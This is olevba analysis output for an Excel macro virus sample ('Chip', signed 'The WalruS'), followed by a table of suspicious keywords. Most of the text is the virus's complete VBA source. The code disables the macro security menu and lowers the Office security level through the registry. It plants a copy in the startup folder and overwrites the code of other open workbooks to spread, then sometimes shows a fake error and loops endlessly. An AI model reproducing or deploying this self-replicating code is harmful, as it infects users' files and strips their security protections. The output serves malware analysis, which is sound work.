olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Chip-96a365854263809d55a4f165d48f54a5caded66b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Chip-96a365854263809d55a4f165d48f54a5caded66b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
Private Sub Workbook_Deactivate()

' Chipper By The WalruS
' v1.00 09/00

    On Error Resume Next
    
    With Application
        .DisplayAlerts = 0
        .ScreenUpdating = 0
        .DisplayStatusBar = 0
        .UserName = "The WalruS"
    End With

    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

    Installed = Dir(Application.StartupPath & "\Book1.")
    If Installed = "" Then
        VBAProject.ThisWorkbook.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    End If
    
    Set ActiveWB = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set ThisWB = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule

    If ActiveWB.Lines(1, 1) <> "'" Then
        ActiveWB.DeleteLines 1, ActiveWB.CountofLines
        ActiveWB.InsertLines 1, ThisWB.Lines(1, ThisWB.CountofLines)
        Application.Caption = "Time For Chipper To Move On!"
        
        With ActiveWorkbook
            .Title = "Chipper"
            .Author = "The WalruS"
        End With
        
        ActiveWorkbook.Save
    End If
    
    If Second(Now) > 58 Then
        MsgBox "Shutdown Error On Previous Close", vbCritical, "Chipper"
        Do
        DoEvents
        Randomize
            If Int(Rnd * 10000) = 2 Then
                Application.WindowState = xlMinimized
                Application.WindowState = xlMaximized
            End If
        Loop
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Chip-96a365854263809d55a4f165d48f54a5caded66b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Chip-96a365854263809d55a4f165d48f54a5caded66b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Chip-96a365854263809d55a4f165d48f54a5caded66b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

